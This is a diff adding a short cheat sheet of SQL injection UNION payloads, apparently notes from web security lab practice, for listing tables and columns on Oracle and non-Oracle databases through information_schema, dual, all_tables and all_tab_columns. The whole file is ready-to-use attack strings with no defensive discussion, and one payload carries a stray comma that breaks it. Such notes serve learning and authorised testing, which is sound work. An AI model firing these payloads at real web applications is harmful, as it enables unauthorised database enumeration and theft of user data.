@@ -1,0 +1,12 @@
+Non-oracle: Find Tables:
+xyz' UNION SELECT table_name,NULL,FROM information_schema.tables -- 
+
+Non-oracle: Find columns:
+xyz' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_abcdef'-- 
+
+Oracle: Find Tables:
+xyz' UNION SELECT 'abc','def' FROM dual-- 
+xyz' UNION SELECT table_name,NULL FROM all_tables-- 
+
+Oracle: Find Columns:
+' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_ABCDEF'--
